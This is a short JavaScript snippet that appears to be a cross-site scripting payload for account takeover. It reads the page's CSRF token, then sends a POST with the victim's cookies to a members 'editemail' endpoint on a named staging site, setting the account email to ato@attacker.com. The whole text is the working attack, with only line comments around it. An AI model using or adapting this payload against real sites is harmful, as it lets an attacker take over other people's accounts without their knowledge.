// Define the request body
const requestBody = `email=ato@attacker.com&fuel_csrf_token=${document.getElementsByName("fuel_csrf_token")[0].value}`;

// Define the URL
const url = 'https://outfitters.stage.sugariapps.com/rest/members/editemail';

// Define the headers
const headers = {
  'Content-Type': 'application/x-www-form-urlencoded'
};

// Define the options for the fetch request
const options = {
  method: 'POST',
  headers: headers,
  body: requestBody,
  credentials: 'include' // Include cookies in the request
};

// Send the fetch request
fetch(url, options)
  .then(response => response.text())
  .then(data => {
    console.log('Response:', data);
  })
  .catch(error => {
    console.error('Error:', error);
  });
